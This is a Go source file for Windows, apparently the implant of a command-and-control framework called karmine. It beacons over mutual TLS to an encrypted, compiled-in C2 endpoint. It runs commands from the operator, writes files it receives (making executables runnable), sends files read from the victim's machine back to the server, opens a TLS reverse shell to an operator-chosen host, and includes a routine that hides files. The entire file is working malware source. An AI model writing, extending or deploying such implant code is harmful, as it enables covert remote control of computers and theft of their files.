//go:build windows

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/fs"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"sync"
	"syscall"
	"time"

	"github.com/pygrum/karmine/client"
	ex "github.com/pygrum/karmine/karma/cmd/exec"
	"github.com/pygrum/karmine/karma/cmd/revshell"
	"github.com/pygrum/karmine/krypto/kes"
	"github.com/pygrum/karmine/krypto/kryptor"
	"github.com/pygrum/karmine/models"
	log "github.com/sirupsen/logrus"
	_ "modernc.org/sqlite"
)

// set at compile time
var (
	InitC2Endpoint  string
	InitWaitSeconds string
	InitUUID        string
	certData        string
	keyData         string
	InitAESKey      string
	X1              string
	X2              string
)

func main() {
	// Assign known commands to command function map
	var wg sync.WaitGroup
	c2Endpoint := InitC2Endpoint
	waitSecondsInt, _ := strconv.Atoi(InitWaitSeconds)
	ticker := time.NewTicker(time.Duration(time.Duration(waitSecondsInt) * time.Second))
	endpointStr, err := kryptor.Decrypt(c2Endpoint, X1, X2)
	if err != nil {
		log.Fatal(err)
	}
	UUID, err := kryptor.Decrypt(InitUUID, X1, X2)
	if err != nil {
		log.Fatal(err)
	}
	mTLSClient, err := client.MTLsClientByKryptor(certData, keyData, X1, X2)
	if err != nil {
		log.Fatal(err)
	}
	wg.Add(2)
	go awaitCmd(string(endpointStr), string(UUID), X1, X2, InitAESKey, ticker, mTLSClient) // thread handling receiving commands

	go awaitFile(string(endpointStr), string(UUID), X1, X2, InitAESKey, ticker, mTLSClient) // thread handling receiving files

	wg.Wait()
}

func awaitFile(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mTLSClient *http.Client) {
	var prevCmd int
	for range ticker.C {
		fObject, cmdID, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "2")
		if err != nil {
			continue
		}
		prevCmd = cmdID
		fileObj := &models.KarObjectFile{}
		if err := json.Unmarshal(fObject, fileObj); err != nil {
			continue
		}
		filename := fileObj.FileName
		resObj := &models.KarResponseObjectFile{}
		var perm fs.FileMode = 0600
		ext := filepath.Ext(filename)
		if ext == ".exe" || ext == ".bat" || ext == ".cmd" {
			perm = 0700
		}
		if err = os.WriteFile(filename, fileObj.FileBytes, perm); err != nil {
			resObj.Error = 1
			resObj.ErrVal = err.Error()
		}
		bytes, _ := json.Marshal(resObj)
		bytes, err = kes.EncryptObject(bytes, aesKey, kX1, kX2)
		if err != nil {
			continue
		}
		go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
			CmdID:  cmdID,
			Type:   2,
			Object: bytes,
		})
	}
}

func awaitCmd(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mTLSClient *http.Client) {
	var prevCmd int
	for range ticker.C {
		cmdObjectBytes, cmdID, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "1")
		if err == nil {
			cmdObj := &models.KarObjectCmd{}
			if err := json.Unmarshal(cmdObjectBytes, cmdObj); err != nil {
				continue
			}
			prevCmd = cmdID
			go parseCmdObject(cmdObj, cmdID, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient)
		}
	}
}

func getObjectBytes(prevCmd int, Endpoint, UUID, kX1, kX2, aesKey string, mTLSClient *http.Client, dataType string) ([]byte, int, error) {
	genericObj, err := requestData(Endpoint, UUID, dataType, mTLSClient)
	if err != nil {
		return nil, 0, err
	}
	if len(genericObj.UUID) != 0 {
		genericObj.Object, err = kes.DecryptObject(genericObj.Object, aesKey, kX1, kX2)
		if err != nil {
			return nil, 0, err
		}
	}
	if genericObj.CmdID == prevCmd {
		return nil, 0, fmt.Errorf("")
	}
	return genericObj.Object, genericObj.CmdID, nil
}

func requestData(Endpoint, UUID, dataType string, mTLSClient *http.Client) (*models.GenericData, error) {
	req, err := http.NewRequest(http.MethodGet, Endpoint, nil)
	if err != nil {
		return nil, err
	}
	// setting uuid header so my request is trusted by C2 server
	req.Header.Add("X-UUID", UUID)
	value := url.Values{
		"t": {dataType},
	}
	req.URL.RawQuery = value.Encode()
	res, err := mTLSClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()
	if res.Body == http.NoBody {
		return nil, fmt.Errorf("")
	}
	genericObj := &models.GenericData{}
	body, _ := ioutil.ReadAll(res.Body)
	if err = json.Unmarshal(body, genericObj); err != nil {
		return nil, err
	}
	if genericObj.UUID != UUID {
		// blank if for everyone
		if len(genericObj.UUID) != 0 {
			return nil, fmt.Errorf("")
		}
	}
	return genericObj, nil
}

func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID string, kX1, kX2, aesKey string, mTLSClient *http.Client) {
	responseObject := &models.KarResponseObjectCmd{}
	filesObject := []models.KarObjectFile{}
	var respObjectBytes []byte
	objType := 1
	var err error
	cmdlet, args := cmdObject.Cmd, cmdObject.Args
	switch cmdlet {
	case 1:
		err := ex.Do(responseObject, args...)
		if err != nil {
			responseObject.Code = 1
			responseObject.Data.Error = err.Error()
		}
	case 3:
		objType = 3
		err := getFiles(&filesObject, args...)
		if err != nil {
			objType = 1
			responseObject.Code = 1
			responseObject.Data.Error = err.Error()
		}
	case 4:
		if len(args) != 2 {
			return
		}
		conf, err := client.TLSDialConfig(certData, keyData, kX1, kX2)
		if err != nil {
			return
		}
		err = revshell.Do(net.JoinHostPort(args[0].StrValue, args[1].StrValue), conf)
		if err != nil {
			responseObject.Code = 1
			responseObject.Data.Error = err.Error()
		} else {
			return
		}
	}
	if objType == 1 {
		respObjectBytes, err = json.Marshal(responseObject)
		if err != nil {
			return
		}
	} else if objType == 3 {
		respObjectBytes, err = json.Marshal(filesObject)
		if err != nil {
			return
		}
	}
	respObjectBytes, err = kes.EncryptObject(respObjectBytes, aesKey, X1, X2)
	if err != nil {
		log.Error("")
		return
	}
	go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
		Type:   objType, // data type 1 is a command
		CmdID:  cmdID,
		Object: respObjectBytes,
	})
}

// generic enough to be called anytime
func postData(Endpoint, UUID string, mTLSClient *http.Client, data *models.GenericData) {
	o, err := json.Marshal(data)
	if err != nil {
		log.Error(err)
		return
	}
	req, err := http.NewRequest(http.MethodPost, Endpoint, bytes.NewReader(o))
	if err != nil {
		log.Error(err)
		return
	}
	// setting uuid header so my request is trusted by C2 server
	req.Header.Add("X-UUID", UUID)
	_, err = mTLSClient.Do(req) // no need to save response
	if err != nil {
		log.Error(err)
		return
	}
}

func HideF(filename string) error {
	filenameW, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return err
	}
	err = syscall.SetFileAttributes(filenameW, syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		return err
	}
	return nil
}

func getFiles(files *[]models.KarObjectFile, args ...models.MultiType) error {
	if len(args) == 0 {
		return fmt.Errorf("")
	}
	for _, path := range args {
		bytes, err := os.ReadFile(path.StrValue)
		if err != nil {
			return err
		}
		*files = append(*files, models.KarObjectFile{
			FileBytes: bytes,
			FileName:  path.StrValue,
		})
	}
	return nil
}
